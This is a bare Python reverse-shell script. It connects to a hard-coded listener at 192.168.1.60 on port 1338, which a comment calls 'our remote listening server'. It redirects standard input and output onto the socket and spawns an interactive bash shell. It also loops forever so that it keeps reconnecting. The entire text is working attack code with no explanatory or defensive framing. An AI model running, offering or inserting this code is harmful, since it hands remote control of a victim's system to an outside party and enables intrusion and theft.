import socket,subprocess,os,pty
host = "192.168.1.60" # Our remote listening server
port = 1338
while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		s.connect((host, port))
		pty.spawn("/bin/bash")

		s.close()
	except Exception as e:
		s.close()
		continue


